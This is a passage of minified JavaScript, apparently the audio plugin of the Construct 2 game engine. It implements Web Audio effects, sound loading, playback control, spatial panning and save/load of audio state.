$(t,e){this.type="tremolo",this.params=[t,e],this.node=G(),this.node.gain.value=1-e/2,this.oscNode=d.createOscillator(),this.oscNode.frequency.value=t,this.oscGainNode=G(),this.oscGainNode.gain.value=e/2,this.oscNode.connect(this.oscGainNode),this.oscGainNode.connect(this.node.gain),W(this.oscNode)}function tt(t,e){this.type="ringmod",this.params=[t,e],this.inputNode=G(),this.wetNode=G(),this.wetNode.gain.value=e,this.dryNode=G(),this.dryNode.gain.value=1-e,this.ringNode=G(),this.ringNode.gain.value=0,this.oscNode=d.createOscillator(),this.oscNode.frequency.value=t,this.oscNode.connect(this.ringNode.gain),W(this.oscNode),this.inputNode.connect(this.ringNode),this.inputNode.connect(this.dryNode),this.ringNode.connect(this.wetNode)}function et(t,e,i,s,n){this.type="distortion",this.params=[t,e,i,s,n],this.inputNode=G(),this.preGain=G(),this.postGain=G(),this.setDrive(i,B(s)),this.wetNode=G(),this.wetNode.gain.value=n,this.dryNode=G(),this.dryNode.gain.value=1-n,this.waveShaper=d.createWaveShaper(),this.curve=new Float32Array(65536),this.generateColortouchCurve(t,e),this.waveShaper.curve=this.curve,this.inputNode.connect(this.preGain),this.inputNode.connect(this.dryNode),this.preGain.connect(this.waveShaper),this.waveShaper.connect(this.postGain),this.postGain.connect(this.wetNode)}function it(t,e,i,s,n){this.type="compressor",this.params=[t,e,i,s,n],this.node=d.createDynamicsCompressor();try{this.node.threshold.value=t,this.node.knee.value=e,this.node.ratio.value=i,this.node.attack.value=s,this.node.release.value=n}catch(t){}}function st(t,e){this.type="analyser",this.params=[t,e],this.node=d.createAnalyser(),this.node.fftSize=t,this.node.smoothingTimeConstant=e,this.freqBins=new Float32Array(this.node.frequencyBinCount),this.signal=new Uint8Array(t),this.peak=0,this.rms=0}function nt(){this.obj=null,this.loadUid=0}function rt(t,e){this.src=t,this.myapi=p,this.is_music=e,this.added_end_listener=!1;var i,s=this;switch(this.outNode=null,this.mediaSourceNode=null,this.panWhenReady=[],this.seekWhenReady=0,this.pauseWhenReady=!1,this.supportWebAudioAPI=!1,this.failedToLoad=!1,this.wasEverReady=!1,p===h&&e&&!M&&(this.myapi=a,this.outNode=G()),this.bufferObject=null,this.audioData=null,this.myapi){case a:this.bufferObject=new Audio,this.bufferObject.crossOrigin="anonymous",this.bufferObject.addEventListener("canplaythrough",function(){s.wasEverReady=!0}),p===h&&d.createMediaElementSource&&!/wiiu/i.test(navigator.userAgent)&&(this.supportWebAudioAPI=!0,this.bufferObject.addEventListener("canplay",function(){!s.mediaSourceNode&&s.bufferObject&&(s.mediaSourceNode=d.createMediaElementSource(s.bufferObject),s.mediaSourceNode.connect(s.outNode))})),this.bufferObject.autoplay=!1,this.bufferObject.preload="auto",this.bufferObject.src=t;break;case h:c.isWKWebView?c.fetchLocalFileViaCordovaAsArrayBuffer(t,function(t){s.audioData=t,s.decodeAudioBuffer()},function(t){s.failedToLoad=!0}):((i=new XMLHttpRequest).open("GET",t,!0),i.responseType="arraybuffer",i.onload=function(){s.audioData=i.response,s.decodeAudioBuffer()},i.onerror=function(){s.failedToLoad=!0},i.send());break;case l:case u:this.bufferObject=!0}}function ot(t,e){var i=this;this.tag=e,this.fresh=!0,this.stopped=!0,this.src=t.src,this.buffer=t,this.myapi=p,this.is_music=t.is_music,this.playbackRate=1,this.hasPlaybackEnded=!0,this.resume_me=!1,this.is_paused=!1,this.resume_position=0,this.looping=!1,this.is_muted=!1,this.is_silent=!1,this.volume=1,this.onended_handler=function(t){i.is_paused||i.resume_me||(this||t.target)===i.active_buffer&&(i.hasPlaybackEnded=!0,i.stopped=!0,r=i.tag,c.trigger(cr.plugins_.Audio.prototype.cnds.OnEnded,n))},this.active_buffer=null,this.isTimescaled=1===y&&!this.is_music||2===y,this.mutevol=1,this.startTime=(this.isTimescaled?c.kahanTime:c.wallTime).sum,this.gainNode=null,this.pannerNode=null,this.pannerEnabled=!1,this.objectTracker=null,this.panX=0,this.panY=0,this.panAngle=0,this.panConeInner=0,this.panConeOuter=0,this.panConeOuterGain=0,this.instanceObject=null;var s=!1;switch(this.myapi!==h||this.buffer.myapi!==a||this.buffer.supportWebAudioAPI||(this.myapi=a),this.myapi){case a:this.is_music?(this.instanceObject=t.bufferObject,s=!t.added_end_listener,t.added_end_listener=!0):(this.instanceObject=new Audio,this.instanceObject.crossOrigin="anonymous",this.instanceObject.autoplay=!1,this.instanceObject.src=t.bufferObject.src,s=!0),s&&this.instanceObject.addEventListener("ended",function(){r=i.tag,i.stopped=!0,c.trigger(cr.plugins_.Audio.prototype.cnds.OnEnded,n)});break;case h:this.gainNode=G(),this.gainNode.connect(V(e)),this.buffer.myapi===h?t.bufferObject&&(this.instanceObject=d.createBufferSource(),this.instanceObject.buffer=t.bufferObject,this.instanceObject.connect(this.gainNode)):(this.instanceObject=this.buffer.bufferObject,this.buffer.outNode.connect(this.gainNode),this.buffer.added_end_listener||(this.buffer.added_end_listener=!0,this.buffer.bufferObject.addEventListener("ended",function(){r=i.tag,i.stopped=!0,c.trigger(cr.plugins_.Audio.prototype.cnds.OnEnded,n)})));break;case l:this.instanceObject=new window.Media(o+this.src,null,null,function(t){t===window.Media.MEDIA_STOPPED&&(i.hasPlaybackEnded=!0,i.stopped=!0,r=i.tag,c.trigger(cr.plugins_.Audio.prototype.cnds.OnEnded,n))});break;case u:this.instanceObject=!0}}J.prototype.connectTo=function(t){this.wetNode.disconnect(),this.wetNode.connect(t),this.dryNode.disconnect(),this.dryNode.connect(t)},J.prototype.remove=function(){this.inputNode.disconnect(),this.filterNode.disconnect(),this.wetNode.disconnect(),this.dryNode.disconnect()},J.prototype.getInputNode=function(){return this.inputNode},J.prototype.setParam=function(t,e,i,s){switch(t){case 0:(e/=100)<0&&(e=0),1<e&&(e=1),this.params[5]=e,U(this.wetNode.gain,e,i,s),U(this.dryNode.gain,1-e,i,s);break;case 1:this.params[1]=e,U(this.filterNode.frequency,e,i,s);break;case 2:this.params[2]=e,U(this.filterNode.detune,e,i,s);break;case 3:this.params[3]=e,U(this.filterNode.Q,e,i,s);break;case 4:this.params[4]=e,U(this.filterNode.gain,e,i,s)}},H.prototype.connectTo=function(t){this.wetNode.disconnect(),this.wetNode.connect(t),this.dryNode.disconnect(),this.dryNode.connect(t)},H.prototype.remove=function(){this.inputNode.disconnect(),this.mainNode.disconnect(),this.delayNode.disconnect(),this.delayGainNode.disconnect(),this.wetNode.disconnect(),this.dryNode.disconnect()},H.prototype.getInputNode=function(){return this.inputNode},H.prototype.setParam=function(t,e,i,s){switch(t){case 0:(e/=100)<0&&(e=0),1<e&&(e=1),this.params[2]=e,U(this.wetNode.gain,e,i,s),U(this.dryNode.gain,1-e,i,s);break;case 4:this.params[1]=R(e),U(this.delayGainNode.gain,R(e),i,s);break;case 5:this.params[0]=e,U(this.delayNode.delayTime,e,i,s)}},q.prototype.connectTo=function(t){this.wetNode.disconnect(),this.wetNode.connect(t),this.dryNode.disconnect(),this.dryNode.connect(t)},q.prototype.remove=function(){this.inputNode.disconnect(),this.convolveNode.disconnect(),this.wetNode.disconnect(),this.dryNode.disconnect()},q.prototype.getInputNode=function(){return this.inputNode},q.prototype.setParam=function(t,e,i,s){0===t&&((e/=100)<0&&(e=0),1<e&&(e=1),this.params[1]=e,U(this.wetNode.gain,e,i,s),U(this.dryNode.gain,1-e,i,s))},K.prototype.connectTo=function(t){this.dryNode.disconnect(),this.dryNode.connect(t),this.wetNode.disconnect(),this.wetNode.connect(t)},K.prototype.remove=function(){this.inputNode.disconnect(),this.delayNode.disconnect(),this.oscNode.disconnect(),this.oscGainNode.disconnect(),this.dryNode.disconnect(),this.wetNode.disconnect(),this.feedbackNode.disconnect()},K.prototype.getInputNode=function(){return this.inputNode},K.prototype.setParam=function(t,e,i,s){switch(t){case 0:(e/=100)<0&&(e=0),1<e&&(e=1),this.params[4]=e,U(this.wetNode.gain,e/2,i,s),U(this.dryNode.gain,1-e/2,i,s);break;case 6:this.params[1]=e/1e3,U(this.oscGainNode.gain,e/1e3,i,s);break;case 7:this.params[2]=e,U(this.oscNode.frequency,e,i,s);break;case 8:this.params[3]=e/100,U(this.feedbackNode.gain,e/100,i,s)}},Q.prototype.connectTo=function(t){this.dryNode.disconnect(),this.dryNode.connect(t),this.wetNode.disconnect(),this.wetNode.connect(t)},Q.prototype.remove=function(){this.inputNode.disconnect(),this.filterNode.disconnect(),this.oscNode.disconnect(),this.oscGainNode.disconnect(),this.dryNode.disconnect(),this.wetNode.disconnect()},Q.prototype.getInputNode=function(){return this.inputNode},Q.prototype.setParam=function(t,e,i,s){switch(t){case 0:(e/=100)<0&&(e=0),1<e&&(e=1),this.params[5]=e,U(this.wetNode.gain,e/2,i,s),U(this.dryNode.gain,1-e/2,i,s);break;case 1:this.params[0]=e,U(this.filterNode.frequency,e,i,s);break;case 2:this.params[1]=e,U(this.filterNode.detune,e,i,s);break;case 3:this.params[2]=e,U(this.filterNode.Q,e,i,s);break;case 6:this.params[3]=e,U(this.oscGainNode.gain,e,i,s);break;case 7:this.params[4]=e,U(this.oscNode.frequency,e,i,s)}},Z.prototype.connectTo=function(t){this.node.disconnect(),this.node.connect(t)},Z.prototype.remove=function(){this.node.disconnect()},Z.prototype.getInputNode=function(){return this.node},Z.prototype.setParam=function(t,e,i,s){4===t&&(this.params[0]=R(e),U(this.node.gain,R(e),i,s))},$.prototype.connectTo=function(t){this.node.disconnect(),this.node.connect(t)},$.prototype.remove=function(){this.oscNode.disconnect(),this.oscGainNode.disconnect(),this.node.disconnect()},$.prototype.getInputNode=function(){return this.node},$.prototype.setParam=function(t,e,i,s){switch(t){case 0:(e/=100)<0&&(e=0),1<e&&(e=1),this.params[1]=e,U(this.node.gain.value,1-e/2,i,s),U(this.oscGainNode.gain.value,e/2,i,s);break;case 7:this.params[0]=e,U(this.oscNode.frequency,e,i,s)}},tt.prototype.connectTo=function(t){this.wetNode.disconnect(),this.wetNode.connect(t),this.dryNode.disconnect(),this.dryNode.connect(t)},tt.prototype.remove=function(){this.oscNode.disconnect(),this.ringNode.disconnect(),this.inputNode.disconnect(),this.wetNode.disconnect(),this.dryNode.disconnect()},tt.prototype.getInputNode=function(){return this.inputNode},tt.prototype.setParam=function(t,e,i,s){switch(t){case 0:(e/=100)<0&&(e=0),1<e&&(e=1),this.params[1]=e,U(this.wetNode.gain,e,i,s),U(this.dryNode.gain,1-e,i,s);break;case 7:this.params[0]=e,U(this.oscNode.frequency,e,i,s)}},et.prototype.setDrive=function(t,e){t<.01&&(t=.01),this.preGain.gain.value=t,this.postGain.gain.value=Math.pow(1/t,.6)*e},et.prototype.shape=function(t,e,i){var s,n=1.05*i*e-e,i=t<0?-1:1,t=t<0?-t:t,s=t<e?t:e+n*(s=t-e,n=1/n,1-Math.exp(-n*s));return s*=i},et.prototype.generateColortouchCurve=function(t,e){for(var i,s=B(t),n=B(e),r=0;r<32768;++r)i=r/32768,i=this.shape(i,s,n),this.curve[32768+r]=i,this.curve[32768-r-1]=-i},et.prototype.connectTo=function(t){this.wetNode.disconnect(),this.wetNode.connect(t),this.dryNode.disconnect(),this.dryNode.connect(t)},et.prototype.remove=function(){this.inputNode.disconnect(),this.preGain.disconnect(),this.waveShaper.disconnect(),this.postGain.disconnect(),this.wetNode.disconnect(),this.dryNode.disconnect()},et.prototype.getInputNode=function(){return this.inputNode},et.prototype.setParam=function(t,e,i,s){0===t&&((e/=100)<0&&(e=0),1<e&&(e=1),this.params[4]=e,U(this.wetNode.gain,e,i,s),U(this.dryNode.gain,1-e,i,s))},it.prototype.connectTo=function(t){this.node.disconnect(),this.node.connect(t)},it.prototype.remove=function(){this.node.disconnect()},it.prototype.getInputNode=function(){return this.node},it.prototype.setParam=function(t,e,i,s){},st.prototype.tick=function(){this.node.getFloatFrequencyData(this.freqBins),this.node.getByteTimeDomainData(this.signal);for(var t=this.node.fftSize,e=0,i=this.peak=0,s=0;e<t;e++)(s=(this.signal[e]-128)/128)<0&&(s=-s),this.peak<s&&(this.peak=s),i+=s*s;this.peak=j(this.peak),this.rms=j(Math.sqrt(i/t))},st.prototype.connectTo=function(t){this.node.disconnect(),this.node.connect(t)},st.prototype.remove=function(){this.node.disconnect()},st.prototype.getInputNode=function(){return this.node},st.prototype.setParam=function(t,e,i,s){},nt.prototype.setObject=function(t){this.obj=t},nt.prototype.hasObject=function(){return!!this.obj},nt.prototype.tick=function(t){},rt.prototype.release=function(){for(var t,e=0,i=0,s=x.length;e<s;++e)t=x[e],(x[i]=t).buffer===this?t.stop():++i;x.length=i,this.mediaSourceNode&&(this.mediaSourceNode.disconnect(),this.mediaSourceNode=null),this.outNode&&(this.outNode.disconnect(),this.outNode=null),this.bufferObject=null,this.audioData=null},rt.prototype.decodeAudioBuffer=function(){var h,t;!this.bufferObject&&this.audioData&&(h=this,d.decodeAudioData?d.decodeAudioData(this.audioData,function(t){var e,i,s,n;if(h.bufferObject=t,h.audioData=null,cr.is_undefined(h.playTagWhenReady)||S)cr.is_undefined(h.convolveWhenReady)||((n=h.convolveWhenReady.convolveNode).normalize=h.normalizeWhenReady,n.buffer=t);else if(h.panWhenReady.length){for(e=0,i=h.panWhenReady.length;e<i;e++){var r,o,a=h.panWhenReady[e];(s=new ot(h,a.thistag)).setPannerEnabled(!0),void 0!==a.objUid&&(a.obj=c.getObjectByUID(a.objUid),!a.obj)||(a.obj?(r=cr.rotatePtAround(a.obj.x,a.obj.y,-a.obj.layer.getAngle(),_,v,!0),o=cr.rotatePtAround(a.obj.x,a.obj.y,-a.obj.layer.getAngle(),_,v,!1),s.setPan(r,o,cr.to_degrees(a.obj.angle-a.obj.layer.getAngle()),a.ia,a.oa,a.og),s.setObject(a.obj)):s.setPan(a.x,a.y,a.a,a.ia,a.oa,a.og),s.play(h.loopWhenReady,h.volumeWhenReady,h.seekWhenReady),h.pauseWhenReady&&s.pause(),x.push(s))}cr.clearArray(h.panWhenReady)}else(s=new ot(h,h.playTagWhenReady||"")).play(h.loopWhenReady,h.volumeWhenReady,h.seekWhenReady),h.pauseWhenReady&&s.pause(),x.push(s)},function(t){h.failedToLoad=!0}):(this.bufferObject=d.createBuffer(this.audioData,!1),this.audioData=null,cr.is_undefined(this.playTagWhenReady)||S?cr.is_undefined(this.convolveWhenReady)||((t=this.convolveWhenReady.convolveNode).normalize=this.normalizeWhenReady,t.buffer=this.bufferObject):((t=new ot(this,this.playTagWhenReady)).play(this.loopWhenReady,this.volumeWhenReady,this.seekWhenReady),this.pauseWhenReady&&t.pause(),x.push(t))))},rt.prototype.isLoaded=function(){switch(this.myapi){case a:var t=4<=this.bufferObject.readyState;return t&&(this.wasEverReady=!0),t||this.wasEverReady;case h:return!!this.audioData||!!this.bufferObject;case l:case u:return!0}return!1},rt.prototype.isLoadedAndDecoded=function(){switch(this.myapi){case a:return this.isLoaded();case h:return!!this.bufferObject;case l:case u:return!0}return!1},rt.prototype.hasFailedToLoad=function(){switch(this.myapi){case a:return!!this.bufferObject.error;case h:return this.failedToLoad}return!1},ot.prototype.hasEnded=function(){switch(this.myapi){case a:return this.instanceObject.ended;case h:return this.buffer.myapi===h?!(!this.fresh&&!this.stopped&&this.instanceObject.loop)&&(!this.is_paused&&this.hasPlaybackEnded):this.instanceObject.ended;case l:return this.hasPlaybackEnded}return!0},ot.prototype.canBeRecycled=function(){return!(!this.fresh&&!this.stopped)||this.hasEnded()},ot.prototype.setPannerEnabled=function(t){p===h&&(!this.pannerEnabled&&t?this.gainNode&&(this.pannerNode||(this.pannerNode=d.createPanner(),"number"==typeof this.pannerNode.panningModel?this.pannerNode.panningModel=s:this.pannerNode.panningModel=["equalpower","HRTF","soundfield"][s],"number"==typeof this.pannerNode.distanceModel?this.pannerNode.distanceModel=w:this.pannerNode.distanceModel=["linear","inverse","exponential"][w],this.pannerNode.refDistance=C,this.pannerNode.maxDistance=O,this.pannerNode.rolloffFactor=k),this.gainNode.disconnect(),this.gainNode.connect(this.pannerNode),this.pannerNode.connect(V(this.tag)),this.pannerEnabled=!0):this.pannerEnabled&&!t&&this.gainNode&&(this.pannerNode.disconnect(),this.gainNode.disconnect(),this.gainNode.connect(V(this.tag)),this.pannerEnabled=!1))},ot.prototype.setPan=function(t,e,i,s,n,r){this.pannerEnabled&&p===h&&(this.pannerNode.setPosition(t,e,0),this.pannerNode.setOrientation(Math.cos(cr.to_radians(i)),Math.sin(cr.to_radians(i)),0),this.pannerNode.coneInnerAngle=s,this.pannerNode.coneOuterAngle=n,this.pannerNode.coneOuterGain=r,this.panX=t,this.panY=e,this.panAngle=i,this.panConeInner=s,this.panConeOuter=n,this.panConeOuterGain=r)},ot.prototype.setObject=function(t){this.pannerEnabled&&p===h&&(this.objectTracker||(this.objectTracker=new nt),this.objectTracker.setObject(t))},ot.prototype.tick=function(t){var e,i;this.pannerEnabled&&p===h&&this.objectTracker&&this.objectTracker.hasObject()&&this.isPlaying()&&(this.objectTracker.tick(t),e=this.objectTracker.obj,i=cr.rotatePtAround(e.x,e.y,-e.layer.getAngle(),_,v,!0),t=cr.rotatePtAround(e.x,e.y,-e.layer.getAngle(),_,v,!1),this.pannerNode.setPosition(i,t,0),void(t=0)!==this.objectTracker.obj.angle&&(t=e.angle-e.layer.getAngle(),this.pannerNode.setOrientation(Math.cos(t),Math.sin(t),0)))},ot.prototype.play=function(t,e,i,s){var n=this.instanceObject;this.looping=t,this.volume=e;var r=i||0;switch(s=s||0,this.myapi){case a:if(1!==n.playbackRate&&(n.playbackRate=1),n.volume!==e*T&&(n.volume=e*T),n.loop!==t&&(n.loop=t),n.muted&&(n.muted=!1),n.currentTime!==r)try{n.currentTime=r}catch(t){}D(this);break;case h:if(this.muted=!1,this.mutevol=1,this.buffer.myapi===h)this.gainNode.gain.value=e*T,this.fresh||(this.instanceObject=d.createBufferSource(),this.instanceObject.buffer=this.buffer.bufferObject,this.instanceObject.connect(this.gainNode)),this.instanceObject.onended=this.onended_handler,this.active_buffer=this.instanceObject,this.instanceObject.loop=t,this.hasPlaybackEnded=!1,0===r?W(this.instanceObject,s):z(this.instanceObject,r,this.getDuration(),s);else{if(1!==n.playbackRate&&(n.playbackRate=1),n.loop!==t&&(n.loop=t),n.volume=e*T,n.currentTime!==r)try{n.currentTime=r}catch(t){}D(this)}break;case l:(!this.fresh&&this.stopped||0!==r)&&n.seekTo(r),n.play(),this.hasPlaybackEnded=!1;break;case u:(c.isDirectCanvas?AppMobi.context:AppMobi.player).playSound(this.src,t)}this.playbackRate=1,this.startTime=(this.isTimescaled?c.kahanTime:c.wallTime).sum-r,this.fresh=!1,this.stopped=!1,this.is_paused=!1},ot.prototype.stop=function(){switch(this.myapi){case a:this.instanceObject.paused||this.instanceObject.pause();break;case h:this.buffer.myapi===h?i(this.instanceObject):this.instanceObject.paused||this.instanceObject.pause();break;case l:this.instanceObject.stop();break;case u:c.isDirectCanvas&&AppMobi.context.stopSound(this.src)}this.stopped=!0,this.is_paused=!1},ot.prototype.pause=function(){if(!(this.fresh||this.stopped||this.hasEnded()||this.is_paused)){switch(this.myapi){case a:this.instanceObject.paused||this.instanceObject.pause();break;case h:this.buffer.myapi===h?(this.resume_position=this.getPlaybackTime(!0),this.looping&&(this.resume_position=this.resume_position%this.getDuration()),this.is_paused=!0,i(this.instanceObject)):this.instanceObject.paused||this.instanceObject.pause();break;case l:this.instanceObject.pause();break;case u:c.isDirectCanvas&&AppMobi.context.stopSound(this.src)}this.is_paused=!0}},ot.prototype.resume=function(){if(!(this.fresh||this.stopped||this.hasEnded())&&this.is_paused){switch(this.myapi){case a:D(this);break;case h:this.buffer.myapi===h?(this.instanceObject=d.createBufferSource(),this.instanceObject.buffer=this.buffer.bufferObject,this.instanceObject.connect(this.gainNode),this.instanceObject.onended=this.onended_handler,this.active_buffer=this.instanceObject,this.instanceObject.loop=this.looping,this.gainNode.gain.value=T*this.volume*this.mutevol,this.updatePlaybackRate(),this.startTime=(this.isTimescaled?c.kahanTime:c.wallTime).sum-this.resume_position/(this.playbackRate||.001),z(this.instanceObject,this.resume_position,this.getDuration())):D(this);break;case l:this.instanceObject.play();break;case u:c.isDirectCanvas&&AppMobi.context.resumeSound(this.src)}this.is_paused=!1}},ot.prototype.seek=function(t){if(!(this.fresh||this.stopped||this.hasEnded()))switch(this.myapi){case a:try{this.instanceObject.currentTime=t}catch(t){}break;case h:if(this.buffer.myapi===h)this.is_paused?this.resume_position=t:(this.pause(),this.resume_position=t,this.resume());else try{this.instanceObject.currentTime=t}catch(t){}break;case l:break;case u:c.isDirectCanvas&&AppMobi.context.seekSound(this.src,t)}},ot.prototype.reconnect=function(t){this.myapi===h&&(this.pannerEnabled?(this.pannerNode.disconnect(),this.pannerNode.connect(t)):(this.gainNode.disconnect(),this.gainNode.connect(t)))},ot.prototype.getDuration=function(t){var e=0;switch(this.myapi){case a:void 0!==this.instanceObject.duration&&(e=this.instanceObject.duration);break;case h:e=this.buffer.bufferObject.duration;break;case l:e=this.instanceObject.getDuration();break;case u:c.isDirectCanvas&&(e=AppMobi.context.getDurationSound(this.src))}return t&&(e/=this.playbackRate||.001),e},ot.prototype.getPlaybackTime=function(t){var e=this.getDuration(),i=0;switch(this.myapi){case a:void 0!==this.instanceObject.currentTime&&(i=this.instanceObject.currentTime);break;case h:if(this.buffer.myapi===h){if(this.is_paused)return this.resume_position;i=(this.isTimescaled?c.kahanTime:c.wallTime).sum-this.startTime}else void 0!==this.instanceObject.currentTime&&(i=this.instanceObject.currentTime);break;case l:break;case u:c.isDirectCanvas&&(i=AppMobi.context.getPlaybackTimeSound(this.src))}return t&&(i*=this.playbackRate),!this.looping&&e<i&&(i=e),i},ot.prototype.isPlaying=function(){return!(this.is_paused||this.fresh||this.stopped||this.hasEnded())},ot.prototype.shouldSave=function(){return!this.fresh&&!this.stopped&&!this.hasEnded()},ot.prototype.setVolume=function(t){this.volume=t,this.updateVolume()},ot.prototype.updateVolume=function(){var t=this.volume*T;switch(isFinite(t)||(t=0),this.myapi){case a:void 0!==this.instanceObject.volume&&this.instanceObject.volume!==t&&(this.instanceObject.volume=t);break;case h:this.buffer.myapi===h?this.gainNode.gain.value=t*this.mutevol:void 0!==this.instanceObject.volume&&this.instanceObject.volume!==t&&(this.instanceObject.volume=t)}},ot.prototype.getVolume=function(){return this.volume},ot.prototype.doSetMuted=function(t){switch(this.myapi){case a:this.instanceObject.muted!==!!t&&(this.instanceObject.muted=!!t);break;case h:this.buffer.myapi===h?(this.mutevol=t?0:1,this.gainNode.gain.value=T*this.volume*this.mutevol):this.instanceObject.muted!==!!t&&(this.instanceObject.muted=!!t)}},ot.prototype.setMuted=function(t){this.is_muted=!!t,this.doSetMuted(this.is_muted||this.is_silent)},ot.prototype.setSilent=function(t){this.is_silent=!!t,this.doSetMuted(this.is_muted||this.is_silent)},ot.prototype.setLooping=function(t){switch(this.looping=t,this.myapi){case a:case h:this.instanceObject.loop!==!!t&&(this.instanceObject.loop=!!t);break;case l:break;case u:c.isDirectCanvas&&AppMobi.context.setLoopingSound(this.src,t)}},ot.prototype.setPlaybackRate=function(t){this.playbackRate=t,this.updatePlaybackRate()},ot.prototype.updatePlaybackRate=function(){var t=this.playbackRate;switch(this.isTimescaled&&(t*=c.timescale),this.myapi){case a:this.instanceObject.playbackRate!==t&&(this.instanceObject.playbackRate=t);break;case h:this.buffer.myapi===h?this.instanceObject.playbackRate.value!==t&&(this.instanceObject.playbackRate.value=t):this.instanceObject.playbackRate!==t&&(this.instanceObject.playbackRate=t)}},ot.prototype.setSuspended=function(t){switch(this.myapi){case a:t?this.isPlaying()?(this.resume_me=!0,this.instanceObject.pause()):this.resume_me=!1:this.resume_me&&(this.instanceObject.play(),this.resume_me=!1);break;case h:t?this.isPlaying()?(this.resume_me=!0,this.buffer.myapi===h?(this.resume_position=this.getPlaybackTime(!0),this.looping&&(this.resume_position=this.resume_position%this.getDuration()),i(this.instanceObject)):this.instanceObject.pause()):this.resume_me=!1:this.resume_me&&(this.buffer.myapi===h?(this.instanceObject=d.createBufferSource(),this.instanceObject.buffer=this.buffer.bufferObject,this.instanceObject.connect(this.gainNode),this.instanceObject.onended=this.onended_handler,this.active_buffer=this.instanceObject,this.instanceObject.loop=this.looping,this.gainNode.gain.value=T*this.volume*this.mutevol,this.updatePlaybackRate(),this.startTime=(this.isTimescaled?c.kahanTime:c.wallTime).sum-this.resume_position/(this.playbackRate||.001),z(this.instanceObject,this.resume_position,this.getDuration())):this.instanceObject.play(),this.resume_me=!1);break;case l:t?this.isPlaying()?(this.instanceObject.pause(),this.resume_me=!0):this.resume_me=!1:this.resume_me&&(this.resume_me=!1,this.instanceObject.play())}},t.Instance=function(t){if(this.type=t,this.runtime=t.runtime,c=this.runtime,(n=this).listenerTracker=null,this.listenerZ=-600,this.runtime.isWKWebView&&(M=!0),!(this.runtime.isiOS||this.runtime.isAndroid&&(this.runtime.isChrome||this.runtime.isAndroidStockBrowser))||this.runtime.isCrosswalk||this.runtime.isDomFree||this.runtime.isAmazonWebApp||M||(I=!0),d=null,"undefined"!=typeof AudioContext?(p=h,d=new AudioContext):"undefined"!=typeof webkitAudioContext&&(p=h,d=new webkitAudioContext),this.runtime.isiOS&&d&&(d.close&&d.close(),"undefined"!=typeof AudioContext?d=new AudioContext:"undefined"!=typeof webkitAudioContext&&(d=new webkitAudioContext)),p!==h&&(this.runtime.isCordova&&void 0!==window.Media?p=l:this.runtime.isAppMobi&&(p=u)),p===l&&(-1<(t=(o=location.href).lastIndexOf("/"))&&(o=o.substr(0,t+1)),o=o.replace("file://","")),this.runtime.isSafari&&this.runtime.isWindows&&"undefined"==typeof Audio)alert("It looks like you're using Safari for Windows without Quicktime.  Audio cannot be played until Quicktime is installed."),this.runtime.DestroyInstance(this);else{if(this.runtime.isDirectCanvas)m=this.runtime.isAndroid;else try{m=!!(new Audio).canPlayType('audio/ogg; codecs="vorbis"')&&!this.runtime.isWindows10}catch(t){m=!1}p,this.runtime.tickMe(this)}};var at=t.Instance.prototype;at.onCreate=function(){this.runtime.audioInstance=this,y=this.properties[0],this.saveload=this.properties[1],this.playinbackground=0!==this.properties[2],this.nextPlayTime=0,s=this.properties[3],w=this.properties[4],this.listenerZ=-this.properties[5],C=this.properties[6],O=this.properties[7],k=this.properties[8],this.listenerTracker=new nt;var t=this.runtime.draw_width||this.runtime.width,e=this.runtime.draw_height||this.runtime.height;p===h&&(d.listener.setPosition(t/2,e/2,this.listenerZ),d.listener.setOrientation(0,0,1,0,-1,0),window.c2OnAudioMicStream=function(t,e){A&&A.disconnect(),E=e.toLowerCase(),(A=d.createMediaStreamSource(t)).connect(V(E))}),this.runtime.addSuspendCallback(function(t){n.onSuspend(t)});var i=this;this.runtime.addDestroyCallback(function(t){i.onInstanceDestroyed(t)})},at.onInstanceDestroyed=function(t){for(var e,i=0,s=x.length;i<s;i++)(e=x[i]).objectTracker&&e.objectTracker.obj===t&&(e.objectTracker.obj=null,e.pannerEnabled&&e.isPlaying()&&e.looping&&e.stop());this.listenerTracker.obj===t&&(this.listenerTracker.obj=null)},at.saveToJSON=function(){for(var t,e,i,s,n={silent:S,masterVolume:T,listenerZ:this.listenerZ,listenerUid:this.listenerTracker.hasObject()?this.listenerTracker.obj.uid:-1,playing:[],effects:{}},r=n.playing,o=0,a=x.length;o<a;o++)(t=x[o]).shouldSave()&&3!==this.saveload&&(t.is_music&&1===this.saveload||!t.is_music&&2===this.saveload||(s=t.getPlaybackTime(),t.looping&&(s%=t.getDuration()),e={tag:t.tag,buffersrc:t.buffer.src,is_music:t.is_music,playbackTime:s,volume:t.volume,looping:t.looping,muted:t.is_muted,playbackRate:t.playbackRate,paused:t.is_paused,resume_position:t.resume_position},t.pannerEnabled&&(e.pan={},s=e.pan,t.objectTracker&&t.objectTracker.hasObject()?s.objUid=t.objectTracker.obj.uid:(s.x=t.panX,s.y=t.panY,s.a=t.panAngle),s.ia=t.panConeInner,s.oa=t.panConeOuter,s.og=t.panConeOuterGain),r.push(e)));var h,c=n.effects;for(i in N)if(N.hasOwnProperty(i)){for(h=[],o=0,a=N[i].length;o<a;o++)h.push({type:N[i][o].type,params:N[i][o].params});c[i]=h}return n};var ht=[];at.loadFromJSON=function(t){var e=t.silent;T=t.masterVolume,this.listenerZ=t.listenerZ,this.listenerTracker.setObject(null);var i=t.listenerUid;-1!==i&&(this.listenerTracker.loadUid=i,ht.push(this.listenerTracker));var s,n,r,o,a,h,c,l,u,p,d,g,f,m,y,_,v,b,w=t.playing;if(3!==this.saveload)for(s=0,n=x.length;s<n;s++)(d=x[s]).is_music&&1===this.saveload||!d.is_music&&2===this.saveload||d.stop();for(g in N)if(N.hasOwnProperty(g))for(s=0,n=N[g].length;s<n;s++)N[g][s].remove();for(g in cr.wipe(N),t.effects)if(t.effects.hasOwnProperty(g))for(s=0,n=(y=t.effects[g]).length;s<n;s++)switch(_=y[s].type,v=y[s].params,_){case"filter":gt(g,new J(v[0],v[1],v[2],v[3],v[4],v[5]));break;case"delay":gt(g,new H(v[0],v[1],v[2]));break;case"convolve":o=v[2],(p=this.getAudioBuffer(o,!1)).bufferObject?b=new q(p.bufferObject,v[0],v[1],o):(b=new q(null,v[0],v[1],o),p.normalizeWhenReady=v[0],p.convolveWhenReady=b),gt(g,b);break;case"flanger":gt(g,new K(v[0],v[1],v[2],v[3],v[4]));break;case"phaser":gt(g,new Q(v[0],v[1],v[2],v[3],v[4],v[5]));break;case"gain":gt(g,new Z(v[0]));break;case"tremolo":gt(g,new $(v[0],v[1]));break;case"ringmod":gt(g,new tt(v[0],v[1]));break;case"distortion":gt(g,new et(v[0],v[1],v[2],v[3],v[4]));break;case"compressor":gt(g,new it(v[0],v[1],v[2],v[3],v[4]));break;case"analyser":gt(g,new 